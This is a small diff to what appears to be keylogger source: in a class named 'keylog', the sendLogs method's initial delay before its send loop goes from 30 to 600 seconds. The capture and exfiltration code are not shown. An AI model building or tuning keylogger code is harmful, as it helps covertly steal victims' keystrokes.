@@ -92,7 +92,7 @@ class keylog:
     def sendLogs(self):
         count = 0
 
-        time.sleep(30)
+        time.sleep(600)
         while True:
             if len(self.loggedData) > 1:
                 try:
